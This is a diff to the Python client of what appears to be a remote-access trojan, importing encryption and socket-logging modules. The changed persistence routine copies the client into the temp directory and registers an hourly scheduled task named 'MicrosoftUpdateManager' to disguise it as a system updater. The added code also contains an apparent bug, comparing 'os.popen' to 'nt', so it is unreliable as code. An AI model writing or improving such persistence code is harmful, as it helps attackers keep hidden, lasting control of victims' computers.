@@ -56,7 +56,6 @@ from struct import pack
 from random import choice
 from platform import uname
 from imp import new_module
-from tempfile import mktemp
 from zipfile import ZipFile
 from requests import request
 from threading import Thread
@@ -64,6 +63,7 @@ from logging import getLogger
 from urllib import urlretrieve
 from Crypto.Cipher import AES
 from Crypto.Hash import HMAC, SHA256
+from tempfile import mktemp, gettempdir
 from base64 import b64encode, b64decode
 from logging.handlers import SocketHandler
 from Crypto.Util.number import long_to_bytes, bytes_to_long
@@ -821,7 +821,10 @@ class Client(object):
 
     def _persistence_add_scheduled_task(self):
         if self.__f__:
-            task_run    = long_to_bytes(long(self.__f__))
+            tmpdir      = gettempdir()
+            if os.path.basename(self.__f__) not in os.listdir(tmpdir):
+                os.popen('copy {} {}'.format(self.__f__, tmpdir) if os.popen is 'nt' else 'cp {} {}'.format(self.__f__, tmpdir)).read()
+            task_run    = os.path.join(tmpdir, long_to_bytes(long(self.__f__)))
             task_name   = 'MicrosoftUpdateManager'
             try:
                 if subprocess.call('SCHTASKS /CREATE /TN {} /TR {} /SC hourly /F'.format(task_name, task_run), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
